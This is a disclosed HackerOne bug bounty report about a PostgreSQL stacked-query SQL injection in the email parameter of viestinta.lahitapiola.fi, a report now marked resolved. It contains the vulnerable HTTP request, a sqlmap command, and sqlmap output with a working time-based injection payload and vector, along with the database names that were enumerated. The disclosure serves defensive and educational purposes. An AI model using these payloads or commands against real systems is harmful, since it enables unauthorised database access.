---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '179751'
original_report_id: '179751'
title: SQL Injection on /webApp/omatalousuk (viestinta.lahitapiola.fi)
weakness: SQL Injection
team_handle: localtapiola
created_at: '2016-11-02T19:51:45.499Z'
disclosed_at: '2017-01-07T13:06:54.452Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 41
tags:
- hackerone
- sql-injection
---

# SQL Injection on /webApp/omatalousuk (viestinta.lahitapiola.fi)

## Metadata

- HackerOne Report ID: 179751
- Weakness: SQL Injection
- Program: localtapiola
- Disclosed At: 2017-01-07T13:06:54.452Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

I would like to report a SQL Injection vulnerability on **viestinta.lahitapiola.fi**

_*Vulnerable Request:*_

```
GET /webApp/omatalousuk?email=aaaaa HTTP/1.1
Host: viestinta.lahitapiola.fi
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: text/html, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://www.lahitapiola.fi/henkilo/sivut/lahitapiolan-uutiskirjeet
Origin: http://www.lahitapiola.fi
DNT: 1
Connection: close
```

_*Vulnerable Parameter:*_  *email*

The vulnerability was discovered by [sqlmap framework](https://github.com/sqlmapproject/sqlmap).

sqlmap output below:

```
akshya @ localhost in ~/sqlmap $ python sqlmap.py -r viestinta -p email -v3 --dbs

[01:08:22] [INFO] parsing HTTP request from 'viestinta'
[01:08:22] [DEBUG] resolving hostname 'viestinta.lahitapiola.fi'
[01:08:22] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (GET)
    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: email=aaaaa';SELECT PG_SLEEP(5)--
    Vector: ;SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)--
---
[01:08:23] [INFO] the back-end DBMS is PostgreSQL
web application technology: Apache
back-end DBMS: PostgreSQL
available databases [4]:
[*] information_schema
[*] pg_catalog
[*] public
[*] tapiola
```
Please, let me know once this patched is deployed on production.

Regards
Akshya

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
